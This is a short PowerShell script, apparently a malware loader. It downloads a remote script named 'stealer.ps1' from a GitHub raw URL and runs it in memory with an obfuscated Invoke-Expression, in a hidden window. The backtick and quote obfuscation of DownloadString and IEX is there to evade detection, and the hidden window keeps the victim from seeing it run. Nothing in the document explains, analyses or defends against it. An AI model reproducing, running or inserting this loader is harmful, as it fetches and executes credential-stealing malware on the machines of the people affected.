
$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/stealer.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
